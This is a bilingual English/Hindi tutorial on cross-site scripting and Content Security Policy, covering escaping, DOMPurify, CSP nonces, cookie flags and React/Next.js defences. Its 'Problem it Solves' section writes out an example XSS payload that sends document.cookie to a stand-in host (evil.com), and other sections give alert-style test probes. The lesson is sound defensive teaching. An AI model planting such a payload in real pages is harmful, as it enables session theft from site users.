# 44. HTML Security (XSS, Content Security Policy)
# हिंदी में: HTML Security — XSS और Content Security Policy

---

## 🔵 Simple Definition (English)
**XSS (Cross-Site Scripting)** is an attack where an attacker gets their JavaScript to run inside your page (via unsanitised user input), so it can steal cookies, tokens or act as the user. **CSP (Content Security Policy)** is an HTTP header/meta tag that tells the browser which sources of scripts, styles and images are allowed, limiting the damage of XSS.

## 🔵 सरल परिभाषा (Hindi)
**XSS (Cross-Site Scripting)** ऐसा हमला है जिसमें attacker अपना JavaScript आपके page के अंदर चलवा देता है (बिना साफ़ किए user input से), और फिर cookies/tokens चुरा सकता है या user बनकर काम कर सकता है। **CSP (Content Security Policy)** एक HTTP header/meta tag है जो browser को बताता है कि scripts, styles, images किन sources से allowed हैं, ताकि XSS का नुकसान सीमित रहे।

---

## 🔴 Problem it Solves
```
VULNERABLE CODE:
  comment = "<img src=x onerror='fetch(\"https://evil.com?c=\"+document.cookie)'>"
  div.innerHTML = comment     // runs the attacker's code in every viewer's browser!

CONSEQUENCES:
  - Session/token theft (account takeover)
  - Fake login forms (phishing inside your trusted domain)
  - Keylogging, crypto-mining, redirect to malware
  - Stored XSS in a Instagram-like comment hits thousands of users

TYPES:
  Stored     -> saved in DB (comments, profile bio), shown to everyone
  Reflected  -> in URL/query, echoed back in the response
  DOM-based  -> client JS puts untrusted data into the DOM (innerHTML, eval)

CSP is "defense in depth": even if a bug exists, the browser blocks
inline/unknown scripts.
```

## 🔴 यह क्यों बना? (Hindi)
```
कमज़ोर code:
  comment = "<img src=x onerror='...cookie चुराओ...'>"
  div.innerHTML = comment   // attacker का code हर viewer के browser में चलेगा!

नुकसान:
  - Session/token चोरी (account कब्ज़ा)
  - Trusted domain के अंदर नकली login form
  - Keylogging, malware पर redirect
  - Stored XSS से हज़ारों users एक साथ प्रभावित

प्रकार: Stored (DB में सेव), Reflected (URL में), DOM-based (client JS से)

CSP: दूसरी सुरक्षा परत। bug हो तब भी browser अनजान/inline scripts रोक देता है।
```

---

## 🟢 How it Works — Step by Step

```
XSS ATTACK FLOW (stored):
  1. Attacker posts comment: <script>steal()</script>
  2. Server saves it without escaping
  3. Victim opens page; server sends the comment inside HTML
  4. Browser sees a <script> tag, executes it with the SITE's privileges
  5. steal() sends document.cookie / localStorage token to attacker

DEFENCES (layers):

1. OUTPUT ENCODING / ESCAPING  (primary defence)
   Convert  < > & " '  to  &lt; &gt; &amp; &quot; &#39;
   Use textContent, not innerHTML. Frameworks (React) escape by default.

2. SANITIZE when HTML is truly needed
   DOMPurify.sanitize(dirty)  (allow-list of tags/attributes)
   Native Sanitizer API / setHTML() is emerging (limited support).

3. CSP - Content-Security-Policy header
   Content-Security-Policy:
       default-src 'self';
       script-src 'self' 'nonce-RANDOM123' https://cdn.example.com;
       style-src 'self';
       img-src 'self' data: https:;
       object-src 'none';
       base-uri 'self';
       frame-ancestors 'none';
   - 'self'   same origin
   - nonce    random per-response value; only <script nonce="..."> runs
   - blocks inline <script> and onclick="" unless nonce/hash allowed
   - report-uri / report-to to log violations
   - Content-Security-Policy-Report-Only to test without breaking

4. COOKIE FLAGS
   Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Lax
   HttpOnly -> JS cannot read it (XSS cannot steal it)

5. OTHER HTML SECURITY
   - target="_blank" links: add rel="noopener noreferrer"
     (modern browsers imply noopener, still good practice)
   - <iframe sandbox> for untrusted content; X-Frame-Options / frame-ancestors
     prevent clickjacking
   - Subresource Integrity: <script src integrity="sha384-..." crossorigin>
   - Avoid eval(), new Function(), document.write, javascript: URLs
   - Validate on the server too (client validation is only UX)
   - Trusted Types (Chrome) to lock dangerous DOM sinks
```

## 🟢 कैसे काम करता है? (Hindi)

```
XSS flow (stored):
  1. Attacker comment में <script>steal()</script> डालता है
  2. Server बिना escape किए सेव कर देता है
  3. Victim page खोलता है, comment HTML में आता है
  4. Browser <script> देखकर चला देता है, site की permissions के साथ
  5. cookie/token attacker को चला जाता है

बचाव की परतें:
1. Escaping (मुख्य): < > & " ' को entities में बदलो। textContent use करो, innerHTML नहीं।
   React default में escape करता है।
2. HTML ज़रूरी हो तो DOMPurify से sanitize।
3. CSP header: default-src 'self', script-src में nonce, object-src 'none'
   -> inline और अनजान scripts block। पहले Report-Only में test करो।
4. Cookie flags: HttpOnly, Secure, SameSite
5. बाकी: rel="noopener noreferrer", iframe sandbox, SRI (integrity),
   eval/document.write से बचो, server पर भी validate करो।
```

---

## 🟡 Real World Example
**Instagram/Twitter comments:** user text such as `<script>alert(1)</script>` is displayed literally as text, not executed, because output is escaped. The famous **Samy worm (MySpace 2005)** spread to 1 million profiles via stored XSS. **Gmail** renders untrusted email HTML inside sandboxed iframes and strips scripts, so a malicious email cannot steal your session. **Banking sites** use strict CSP with nonces and `HttpOnly` cookies.

## 🟡 Real Example Hindi mein
**Instagram/Twitter comments:** user अगर `<script>alert(1)</script>` लिखे तो वो text की तरह दिखता है, चलता नहीं, क्योंकि output escape होता है। मशहूर **Samy worm (MySpace 2005)** stored XSS से 10 लाख profiles में फैल गया था। **Gmail** अनजान email का HTML sandboxed iframe में दिखाता है और scripts हटा देता है, इसलिए खराब email आपका session नहीं चुरा सकती। **Banking sites** nonce वाला सख़्त CSP और `HttpOnly` cookies use करती हैं।

---

## 💻 Live Code Example

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- CSP via meta tag (header is preferred; meta cannot do frame-ancestors/report-uri).
       This policy: only same-origin resources; NO inline scripts allowed except
       the one carrying the nonce below.
       NOTE: with this policy, inline onclick="" attributes would be blocked. -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'nonce-abc123'; style-src 'unsafe-inline'; img-src 'self' data:; object-src 'none'; base-uri 'self'">

  <title>XSS Safe vs Unsafe Demo</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 20px auto; padding: 0 16px; }
    .box { border: 1px solid #ccc; padding: 10px; margin: 8px 0; min-height: 40px; background: #fafafa; }
    .bad { border-color: #c62828; } .good { border-color: #2e7d32; }
    input { width: 100%; padding: 8px; box-sizing: border-box; }
    button { padding: 8px 14px; margin-top: 8px; cursor: pointer; }
  </style>
</head>
<body>
  <h1>XSS demo</h1>
  <p>Try typing: <code>&lt;img src=x onerror="alert('XSS')"&gt;</code></p>
  <input id="comment" value="&lt;b&gt;Nice food!&lt;/b&gt;">
  <button id="post">Post comment</button>

  <h3>Unsafe: innerHTML (CSP blocks inline handler here, but never rely on that alone)</h3>
  <div id="unsafe" class="box bad"></div>

  <h3>Safe: textContent</h3>
  <div id="safe" class="box good"></div>

  <h3>Safe: escape function when you must build HTML strings</h3>
  <div id="escaped" class="box good"></div>

  <!-- Only scripts with the matching nonce run. In real apps the nonce is random per response. -->
  <script nonce="abc123">
    // Escape the 5 dangerous characters
    function escapeHTML(str) {
      return str.replace(/[&<>"']/g, ch => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
      }[ch]));
    }

    document.getElementById('post').addEventListener('click', () => {
      const text = document.getElementById('comment').value;

      // ❌ UNSAFE: interprets the string as HTML
      document.getElementById('unsafe').innerHTML = text;

      // ✅ SAFE: treated purely as text
      document.getElementById('safe').textContent = text;

      // ✅ SAFE: escaped before being put into an HTML string
      document.getElementById('escaped').innerHTML = '<em>' + escapeHTML(text) + '</em>';
    });
  </script>

  <!-- Safe external link -->
  <p><a href="https://example.com" target="_blank" rel="noopener noreferrer">External site</a></p>

  <!-- Sandboxed iframe for untrusted content: no scripts, no same-origin access -->
  <iframe sandbox srcdoc="<p>Untrusted content here</p>" title="Sandboxed" width="300" height="60"></iframe>
</body>
</html>
```

```
# Server header version (Express / Nginx) - preferred over <meta>
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax
```

---

## 🟠 React/Next.js Connection

```jsx
// 1. React ESCAPES by default: safe
const comment = '<img src=x onerror=alert(1)>';
<p>{comment}</p>            // shown as text, not executed

// 2. The dangerous escape hatch:
<div dangerouslySetInnerHTML={{ __html: comment }} />   // XSS risk!
// Sanitize first:
import DOMPurify from 'isomorphic-dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment) }} />

// 3. href injection: React does NOT block javascript: URLs reliably
<a href={userUrl}>Visit</a>    // userUrl = "javascript:alert(1)" -> risk
// Validate: only allow http: / https:
const safe = /^https?:\/\//i.test(userUrl) ? userUrl : '#';

// 4. Next.js CSP with nonce via middleware (middleware.js)
import { NextResponse } from 'next/server';
export function middleware(req) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const csp = `default-src 'self'; script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`;
  const headers = new Headers(req.headers);
  headers.set('x-nonce', nonce);                 // read in layout to pass to <Script nonce>
  headers.set('Content-Security-Policy', csp);
  const res = NextResponse.next({ request: { headers } });
  res.headers.set('Content-Security-Policy', csp);
  return res;
}

// 5. next.config.js security headers (static ones):
// headers: () => [{ source: '/(.*)', headers: [
//   { key: 'X-Content-Type-Options', value: 'nosniff' },
//   { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' } ] }]

// 6. Store tokens in HttpOnly cookies, not localStorage, to reduce XSS impact.
// 7. Tailwind/CSS-in-JS: avoid unsafe-inline for styles when possible (use nonces).
```

---

## ⚫ Interview Questions + Answers

**Q1: What is XSS and what are its types?**
A1: Cross-Site Scripting lets an attacker run JavaScript in a victim's browser in the context of your site. Types: Stored (saved on the server, e.g. comments), Reflected (payload in the request, echoed in the response), DOM-based (client JS writes untrusted data into dangerous sinks like `innerHTML`).

**Q2: How do you prevent XSS?**
A2: Escape/encode output by context, prefer `textContent` over `innerHTML`, sanitize necessary HTML with DOMPurify, avoid `eval` and `javascript:` URLs, use framework auto-escaping, set a strong CSP, use `HttpOnly` cookies, and validate input on the server.

**Q3: What is CSP and how does it help?**
A3: A response header that whitelists where scripts, styles, images and other resources may load from. It blocks inline scripts and unknown origins, so even if an attacker injects a `<script>`, the browser refuses to run it. Use nonces or hashes instead of `'unsafe-inline'`, and `Report-Only` mode to roll out safely.

**Q4: What is the difference between XSS and CSRF?**
A4: XSS injects and runs attacker script in your site, abusing the user's trust in the site. CSRF tricks the user's browser into sending an authenticated request to your site from another site, abusing the site's trust in the browser. Defences: escaping/CSP for XSS; SameSite cookies and CSRF tokens for CSRF.

**Q5: Is React safe from XSS? Where are the holes?**
A5: JSX escapes values by default, so it is safe mostly. Holes: `dangerouslySetInnerHTML`, `href`/`src` with `javascript:` URLs, server-side rendering unsafe strings into scripts (e.g. serialised state: escape `<`), third-party scripts, and DOM manipulation through refs/`innerHTML`.

---

## 🔷 Common Mistakes to Avoid

❌ **Mistake 1:** `innerHTML` with user data
```js
// WRONG
el.innerHTML = userInput;
// CORRECT
el.textContent = userInput;
```

❌ **Mistake 2:** Storing JWT in localStorage
✅ **Correct way:** Use `HttpOnly; Secure; SameSite` cookie so injected JS cannot read it.

❌ **Mistake 3:** CSP with `'unsafe-inline'` and `'unsafe-eval'` everywhere
```
WRONG:   script-src 'self' 'unsafe-inline' 'unsafe-eval'
CORRECT: script-src 'self' 'nonce-RANDOM' (and move inline code to files)
```

❌ **Mistake 4:** Trusting client-side validation / blacklisting `<script>`
✅ **Correct way:** Escape per output context on the server; allow-list sanitize.

❌ **Mistake 5:** `target="_blank"` without `rel`
✅ **Correct way:** `rel="noopener noreferrer"`.

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| XSS | Injected script runs in your page | Page में घुसाया गया script चलना |
| Stored XSS | Payload saved in DB | DB में सेव payload |
| Reflected XSS | Payload echoed from request | Request से वापस आया payload |
| CSP | Header limiting resource sources | Resource sources पर रोक का header |
| nonce | One-time random token for scripts | एक बार का random token |
| Sanitize | Strip dangerous HTML | खतरनाक HTML हटाना |
| HttpOnly | Cookie hidden from JS | JS से छिपी cookie |
| SRI | Hash check for CDN files | CDN file का hash जाँच |
| Clickjacking | Hidden iframe tricks clicks | छिपे iframe से click चुराना |
| Sandbox | Restricted iframe | सीमित permissions वाला iframe |

---

## ⚡ 3-Line Summary
**English:**
1. XSS runs attacker JavaScript in your page via unsafe output; prevent it by escaping, using `textContent`, and sanitizing with DOMPurify.
2. CSP (nonce-based, no `unsafe-inline`) is a second layer that blocks injected scripts; add `HttpOnly`, `Secure`, `SameSite` cookies, `rel="noopener"`, SRI and iframe `sandbox`.
3. React escapes by default; the risks are `dangerouslySetInnerHTML` and `javascript:` URLs; Next.js can set CSP nonces in middleware.

**Hindi:**
1. XSS में attacker का JavaScript आपके page में चलता है; बचाव: escaping, `textContent`, DOMPurify।
2. CSP (nonce वाला, बिना `unsafe-inline`) दूसरी परत है; साथ में `HttpOnly`, `Secure`, `SameSite` cookies, `rel="noopener"`, SRI और iframe `sandbox`।
3. React default में escape करता है; खतरा `dangerouslySetInnerHTML` और `javascript:` URLs में है; Next.js middleware में CSP nonce लगा सकते हैं।

---

## ➡️ Next Topic
**45. Shadow DOM Basics** — अब सीखें कि component के CSS और DOM को बाकी page से अलग (encapsulate) कैसे रखें।
